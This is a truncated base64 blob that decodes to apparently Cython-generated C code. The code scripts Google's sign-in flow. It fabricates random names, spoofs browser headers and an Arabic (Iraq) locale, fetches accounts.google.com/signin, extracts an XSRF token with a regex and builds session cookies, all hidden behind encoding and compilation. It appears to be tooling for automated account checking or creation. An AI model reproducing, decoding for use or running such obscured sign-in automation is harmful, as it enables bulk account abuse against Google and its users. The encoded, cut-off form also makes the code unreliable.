C0+X19weXhfbl91X3JyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzh9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3BmXzJvcF8zdGxsX2dlbmV4cHIoTlVMTCwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19weXhfdl9uMSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNCA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7XG4gICAgICBfX3B5eF90XzggPSBfX3B5eF9idWlsdGluX3JhbmdlOyBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfN307XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgfVxuICAgICAgX19weXhfdF84ID0gX19weXhfcGZfMm9wXzN0bGxfM2dlbmV4cHIoTlVMTCwgX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgIF9fcHl4X3RfOCA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdl9uMiA9ICgoUHlPYmplY3QqKV9fcHl4X3RfOCk7XG4gICAgICBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IE5VTEw7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7XG4gICAgICBfX3B5eF90XzcgPSBfX3B5eF9idWlsdGluX3JhbmdlOyBcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X3RfNX07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgfVxuICAgICAgX19weXhfdF83ID0gX19weXhfcGZfMm9wXzN0bGxfNmdlbmV4cHIoTlVMTCwgX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF90XzggPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3RfNyA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19weXhfdl9ob3N0ID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExNywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FyX0lRX2FyX3FfMF85X2VuX0lRX3FfMF84X2VuX3EpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcilcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMjEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzUpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTIxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdl9oZTMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF82KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ25pbn07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlMywgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXMxID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyNywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxMjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JlczEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTI4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHtcbiAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzYpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2RhdGFfaW5pdGlhbF9zZXR1cF9kYXRhX251bGxfbnVsLCBfX3B5eF90XzR9O1xuICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfODtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzJ9O1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JvdXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfdG9rID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEzMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzcgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTMzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmF